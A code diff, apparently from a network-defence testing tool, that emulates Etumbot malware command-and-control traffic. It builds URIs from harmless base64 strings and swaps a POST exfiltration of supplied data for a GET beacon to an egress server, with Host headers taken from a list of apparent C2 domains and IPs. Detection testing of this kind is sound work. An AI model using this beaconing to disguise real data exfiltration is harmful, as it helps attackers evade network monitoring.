@@ -27,6 +27,17 @@ class Actor:
             '198.209.212.82', '143.89.47.132', '196.1.199.15',
             'wwap.publiclol.com', '59.0.249.11', '190.16.246.129',
             '211.53.164.152', 'finance.yesplusno.com']
+        self.encoded_string = [
+            'dGhpc2lzYXRlc3RzdHJpbmdkb250Y2F0Y2htZQ--',
+            'Y2F0Y2hldHVtYm90aWZ5b3VjYW4-',
+            'Z29oYWxleWdvYW5kaGFja2F3YXl0aGVnaWJzb24-',
+            'bHVrZXJlYWxseWlzdGhlbWFubXl0aGFuZGxlZ2VuZA--',
+            'd2h5aXNwZW5uc3RhdGVzb2JhZGF0Zm9vdGJhbGw-',
+            'U2VtaW5vbGVzd291bGRkZXN0cm95cGVubnN0YXRl',
+            'dGhlYnJvbmNvc2FyZWJldHRlcnRoYW5yYXZlbnM-',
+            'bm90cmVkYW1lY2hlYXRzdG93aW4-',
+            'dGhlU2VtaW5vbGVzYmVhdG5vcmVkYW1l',
+            'YmpwZW5uaXNhbmF3ZXNvbWVmaWdodGVy']
         self.post_data = [
             {'etumbot_id': 'uid=0(root) gid=0(root) groups=0(root)'},
             {'etumbot_whoami': 'root'}, {'etumbot_dir': 'C:\\, C:\\Windows'},
@@ -34,9 +45,11 @@ class Actor:
             {'etumbot_ipconfig': '192.168.1.83 255.255.255.0 192.168.1.1'},
             {'etumbot_ping': 'google.com time=11.6, 19.1, 12.8, 20'}]
         self.uris = [
-            ''
-            ]
-
+            '/image/' + random.choice(self.encoded_string) + '.jpg',
+            '/history/' + random.choice(self.encoded_string) + '.asp',
+            'manage/asp/item.asp?id=' + random.choice(self.encoded_string) + '&&mux=' + random.choice(self.encoded_string),
+            '/article/30441/Review.asp?id=' + random.choice(self.encoded_string) + '&&date=' + random.choice(self.encoded_string),
+            '/tech/s.asp?m=' + random.choice(self.encoded_string)]
 
     def emulate(self, data_to_exfil=None):
 
@@ -70,43 +83,15 @@ class Actor:
             etumbot_headers['Host'] = selected_domain
             etumbot_uri = random.choice(self.uris)
 
-            # Determining which data is being sent out by agent
-            if data_to_exfil is None:
-                  posted_data = random.choice(self.post_data)
-            else:
-                  posted_data = {'putterpanda_data': data_to_exfil}
-
-            # UrlEncode and send the data out
-            posted_data = urllib.urlencode(posted_data)
-            post_req = urllib2.Request(
-                "http://" + self.egress_server + etumbot_uri, posted_data, headers=etumbot_headers)
+            get_req2 = urllib2.Request(
+                "http://" + self.egress_server + etumbot_uri, headers=etumbot_headers)
 
             try:
-                urllib2.urlopen(post_req)
+                urllib2.urlopen(get_req2)
             except urllib2.URLError:
                 print "[*] Error: Cannot connect to etumbot data exfil server!"
                 print "[*] Error: Possible firewall, or proxy prventing this?"
                 sys.exit(1)
 
         print "[*] INFO: Etumbot C2 comms complete!"
-
         return
-
-    def gen_numbers(self, num=5):
-        if num == 5:
-            return random.randint(10000, 99999)
-        elif num == 2:
-            return random.randint(10, 99)
-        elif num == 6:
-            return random.randint(100000, 999999)
-        elif num == 7:
-            return random.randint(1000000, 9999999)
-        else:
-            print "odd error?"
-            sys.exit()
-        return
-
-    def random_letters(self, total=24):
-        random_string = ''.join(
-            random.choice('ABCDEFGHIJKLMNOP') for x in range(total))
-        return random_string
